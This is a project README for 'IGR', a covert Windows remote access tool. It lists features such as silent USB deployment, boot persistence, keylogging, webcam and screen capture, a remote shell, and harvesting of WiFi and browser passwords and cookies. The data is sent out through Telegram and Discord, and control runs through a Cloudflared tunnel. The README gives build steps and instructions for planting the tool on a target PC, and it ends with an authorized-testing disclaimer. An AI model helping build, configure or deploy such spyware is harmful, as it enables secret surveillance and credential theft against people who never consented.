# IGR

Silent auto-start remote access tool for Windows. Deploys via USB, starts before login, and exposes a full-featured web dashboard through a Cloudflared tunnel.

## Features

- **Silent deployment** — No console, no visible windows, auto-starts at boot via Scheduled Task + Registry + Startup folder
- **Web dashboard** — Full control panel accessible from any browser via Cloudflared tunnel URL
- **Screen streaming** — Live screen capture with multi-monitor support
- **Webcam streaming** — Live webcam feed with device selection
- **Remote control** — Mouse and keyboard control from dashboard
- **Keylogger** — Global keystroke logging with persistent storage
- **File browser** — Browse, download, and upload files on host
- **Command shell** — Execute system commands remotely
- **Data harvesting** — WiFi passwords, Chrome/Edge saved passwords, browser cookies, installed software, recent documents, full system inventory
- **Troll features** — Popups (normal/persistent/hydra), screen freeze, TTS, audio playback, mouse jitter, ghost typing, wallpaper change, monitor on/off
- **Remote tools** — Download & execute, self-update, file search, browser open, process kill, LAN scanner
- **Stealth** — Internal spreading (copies to hidden locations), registry persistence, anti-task-manager, fake IIS headers, hidden files
- **Watchdog** — Monitors process and restarts if killed
- **Notifications** — Discord webhook (URL only) + Telegram bot (full system report with WiFi passwords, software list, etc.)
- **Offline queue** — Buffers Telegram messages when offline, sends when connection returns
- **No admin required** — Falls back gracefully if UAC denied

## Project Structure

```
imagine/
├── main.py          # Main application (single file)
├── build.bat        # Build script (PyInstaller)
├── setup.bat        # USB deployment script
├── cleanup.bat      # Remove all traces
└── README.md
```

## Configuration

Edit the top of `main.py`:

```python
DISCORD_WEBHOOK_URL = "your_discord_webhook"
TELEGRAM_BOT_TOKEN = "your_telegram_bot_token"
TELEGRAM_CHAT_ID = "your_telegram_chat_id"
DASHBOARD_PASSWORD = "your_password"
UPDATE_URL = ""  # URL for self-update
```

## Build

```batch
build.bat
```

Output: `dist\igr.exe`

## Deploy via USB

1. Format a USB stick
2. Copy `setup.bat` to the **root** of the USB
3. Create a `subfiles\` folder on the USB
4. Copy `dist\igr.exe` and `cloudflared.exe` into `subfiles\`
5. Plug into target PC, run `setup.bat`

## Cleanup

Run `cleanup.bat` on the target machine to remove all traces.

## Requirements

- Windows 10/11
- Python 3.8+ (for building only)
- See `build.bat` for Python package dependencies

## Disclaimer

This project is for educational and authorized testing purposes only. Unauthorized access to computer systems is illegal. Use responsibly and only on systems you own or have explicit permission to test.
